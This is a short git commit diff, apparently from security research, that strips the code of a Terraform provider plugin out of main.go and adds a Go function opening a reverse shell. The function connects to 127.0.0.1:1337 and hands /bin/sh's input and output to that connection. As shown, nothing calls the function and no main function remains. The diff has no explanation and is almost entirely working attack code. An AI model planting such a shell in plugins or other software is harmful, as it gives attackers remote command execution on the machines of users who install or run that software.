7830c0f070a8dc148835a587f404f175d77a1ba8
Elliot Ward <elliot.ward@snyk.io>
2023-11-14 16:24:42 +0100

    shell

--- main.go
+++ main.go
@@ -1,26 +1,14 @@
 package main
 
 import (
-	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
-	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
+	"net"
+	"os/exec"
 )
 
-func main() {
-	plugin.Serve(&plugin.ServeOpts{
-		ProviderFunc: func() *schema.Provider {
-			return &schema.Provider{
-				DataSourcesMap: map[string]*schema.Resource{
-					"example": dataSourceHelloWorld(),
-				},
-			}
-		},
-	})
-}
-
-func dataSourceHelloWorld() *schema.Resource {
-	return &schema.Resource{
-		Read: func(d *schema.ResourceData, m interface{}) error {
-			return nil
-		},
-	}
+func revshell() {
+	c, _ := net.Dial("tcp", "127.0.0.1:1337")
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+	cmd.Run()
+	c.Close()
 }
